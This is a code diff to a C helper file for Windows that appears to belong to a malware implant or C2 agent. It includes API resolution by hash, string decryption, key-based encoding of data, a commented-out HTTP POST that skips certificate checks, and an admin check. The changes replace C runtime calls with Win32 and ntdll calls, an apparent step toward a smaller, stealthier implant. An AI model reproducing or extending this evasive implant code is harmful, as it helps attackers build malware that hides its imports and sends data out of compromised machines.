@@ -21,7 +21,7 @@ DWORD HashStringRotr32A
 {
 	DWORD Value = 0;
 
-	for (INT Index = 0; Index < strlen(s); Index++)
+	for (INT Index = 0; Index < lstrlenA(s); Index++)
 		Value = s[Index] + HashStringRotr32SubA(Value, SEED);
 
 	return Value;
@@ -69,7 +69,7 @@ UINT32 CopyDotStr
 	_In_ PCHAR String
 )
 {
-	for (UINT32 i = 0; i < strlen(String); i++)
+	for (UINT32 i = 0; i < lstrlenA(String); i++)
 	{
 		if (String[i] == '.')
 			return i;
@@ -140,7 +140,7 @@ LPCWSTR DecryptStringW
 //				}
 //
 //				memcpy((PVOID)Library, (PVOID)pFunctionAddress, Index);
-//				memcpy((PVOID)Function, (PVOID)((ULONG_PTR)pFunctionAddress + Index + 1), strlen((LPCSTR)((ULONG_PTR)pFunctionAddress + Index + 1)));
+//				memcpy((PVOID)Function, (PVOID)((ULONG_PTR)pFunctionAddress + Index + 1), lstrlenA((LPCSTR)((ULONG_PTR)pFunctionAddress + Index + 1)));
 //				if ((hModule2 = LoadLibraryA(Library)) != NULL) {
 //					pFunctionAddress = (UINT64)GetProcAddressByHash(hModule2, HASHA(Function));
 //				}
@@ -215,7 +215,7 @@ DWORD StrHash
 	DWORD dwHashVal = 0;
 	DWORD dwTemp = 0;
 
-	for (DWORD i = 0; i < strlen(s); i++) {
+	for (DWORD i = 0; i < lstrlenA(s); i++) {
 		dwHashVal = (dwHashVal << 4) + s[i];
 		dwTemp = dwHashVal & 0xF0000000L;
 		if (dwTemp != 0)
@@ -263,9 +263,9 @@ LPSTR Encode
 	CHAR c;
 	DWORD dwPlaceholder;
 
-	lpCipher = ALLOC(strlen(lpPlainText) + 1);
-	for (DWORD i = 0; i < strlen(lpPlainText); i++) {
-		c = lpKey[i % strlen(lpKey)];
+	lpCipher = ALLOC(lstrlenA(lpPlainText) + 1);
+	for (DWORD i = 0; i < lstrlenA(lpPlainText); i++) {
+		c = lpKey[i % lstrlenA(lpKey)];
 		dwPlaceholder = (DWORD)(lpPlainText[i]) + (DWORD)(c);
 		lpCipher[i] = (UCHAR)(dwPlaceholder % 127);
 	}
@@ -293,7 +293,7 @@ LPSTR Encode
 //
 //	lpResult = Encode(lpKey, lpData);
 //	hRequest = HttpOpenRequestA(hConnect, pStrings->lpPost, lpEndpoint, NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
-//	bReqSuccess = HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)lpResult, strlen(lpResult));
+//	bReqSuccess = HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)lpResult, lstrlenA(lpResult));
 //	lpResult = NULL;
 //
 //	if (bReqSuccess) {
@@ -364,7 +364,7 @@ VOID Decrypt
 	DWORD i;
 
 	for (i = 0; i < dwSize; i++) {
-		pBuffer[i] ^= lpKey[i % strlen(lpKey)];
+		pBuffer[i] ^= lpKey[i % lstrlenA(lpKey)];
 	}*/
 	return;
 }
@@ -392,9 +392,9 @@ LPWSTR ConvertToWChar
 	DWORD dwSize = 0;
 	LPWSTR lpResult = NULL;
 
-	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, strlen(szInput), NULL, 0);
+	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, lstrlenA(szInput), NULL, 0);
 	lpResult = ALLOC((dwSize + 1) * sizeof(WCHAR));
-	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, strlen(szInput), lpResult, dwSize);
+	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, lstrlenA(szInput), lpResult, dwSize);
 	return lpResult;
 }
 
@@ -682,18 +682,18 @@ BOOL StartWith
 	DWORD dwCmpResult = 0;
 	BOOL bResult = FALSE;
 
-	if (strlen(lpSrc) < strlen(lpPattern)) {
+	if (lstrlenA(lpSrc) < lstrlenA(lpPattern)) {
 		return FALSE;
 	}
 
-	c = lpSrc[strlen(lpPattern)];
-	lpSrc[strlen(lpPattern)] = '\0';
-	dwCmpResult = strcmp(lpSrc, lpPattern);
+	c = lpSrc[lstrlenA(lpPattern)];
+	lpSrc[lstrlenA(lpPattern)] = '\0';
+	dwCmpResult = lstrcmpA(lpSrc, lpPattern);
 	if (dwCmpResult == 0) {
 		bResult = TRUE;
 	}
 
-	lpSrc[strlen(lpPattern)] = c;
+	lpSrc[lstrlenA(lpPattern)] = c;
 	return bResult;
 }
 
@@ -706,11 +706,11 @@ BOOL EndWithA
 	DWORD dwCmpResult = 0;
 	BOOL bResult = FALSE;
 
-	if (strlen(lpSrc) < strlen(lpPattern)) {
+	if (lstrlenA(lpSrc) < lstrlenA(lpPattern)) {
 		return FALSE;
 	}
 
-	dwCmpResult = strcmp(&lpSrc[strlen(lpSrc) - strlen(lpPattern)], lpPattern);
+	dwCmpResult = lstrcmpA(&lpSrc[lstrlenA(lpSrc) - lstrlenA(lpPattern)], lpPattern);
 	if (dwCmpResult == 0) {
 		bResult = TRUE;
 	}
@@ -764,6 +764,14 @@ BOOL IsUserAdmin(VOID)
 	return bIsAdmin;
 }
 
+int IsPrint
+(
+	int c
+)
+{
+	return (c >= 0x20 && c <= 0x7E);
+}
+
 VOID HexDump
 (
 	_In_ PBYTE pBuffer,
@@ -771,6 +779,11 @@ VOID HexDump
 )
 {
 	DWORD i, j;
+
+	if (cbBuffer >= 0x400) {
+		cbBuffer = 0x400;
+	}
+
 	for (i = 0; i < cbBuffer; i += 16) {
 		PrintFormatA("%08x  ", i);
 
@@ -786,7 +799,12 @@ VOID HexDump
 		PrintFormatA(" |");
 		for (j = 0; j < 16; j++) {
 			if (i + j < cbBuffer) {
-				PrintFormatA("%c", isprint(pBuffer[i + j]) ? pBuffer[i + j] : '.');
+				if (IsPrint(pBuffer[i + j])) {
+					PrintFormatA("%c", pBuffer[i + j]);
+				}
+				else {
+					PrintFormatA(".");
+				}
 			}
 			else {
 				PrintFormatA(" ");
@@ -1064,7 +1082,7 @@ CLEANUP:
 	return Result;
 }
 
-LPSTR GenerateUUIDv4()
+LPSTR GenerateUUIDv4(VOID)
 {
 	RPC_STATUS Status = RPC_S_OK;
 	UUID pUuid;
@@ -1129,7 +1147,7 @@ VOID FreeAllocatedHeap
 )
 {
 	if (lpBuffer != NULL) {
-		HeapFree(GetProcessHeap(), 0, lpBuffer);
+		RtlFreeHeap(GetProcessHeap(), 0, lpBuffer);
 	}
 }
 
@@ -1221,4 +1239,43 @@ CLEANUP:
 	}*/
 
 	return pResult;
+}
+
+VOID PrintFormatA
+(
+	_In_ LPSTR lpFormat,
+	...
+)
+{
+#ifdef _DEBUG
+	va_list Args;
+	CHAR szBuffer[0x800];
+	DWORD dwNumberOfCharsWritten = 0;
+
+	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+	va_start(Args, lpFormat);
+	wvsprintfA(szBuffer, lpFormat, Args);
+	WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), szBuffer, lstrlenA(szBuffer), &dwNumberOfCharsWritten, NULL);
+	va_end(Args);
+#endif
+}
+
+
+VOID PrintFormatW
+(
+	_In_ LPWSTR lpFormat,
+	...
+)
+{
+#ifdef _DEBUG
+	va_list Args;
+	WCHAR wszBuffer[0x800];
+	DWORD dwNumberOfCharsWritten = 0;
+
+	RtlSecureZeroMemory(wszBuffer, sizeof(wszBuffer));
+	va_start(Args, lpFormat);
+	wvsprintfW(wszBuffer, lpFormat, Args);
+	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), wszBuffer, lstrlenW(wszBuffer), &dwNumberOfCharsWritten, NULL);
+	va_end(Args);
+#endif
 }
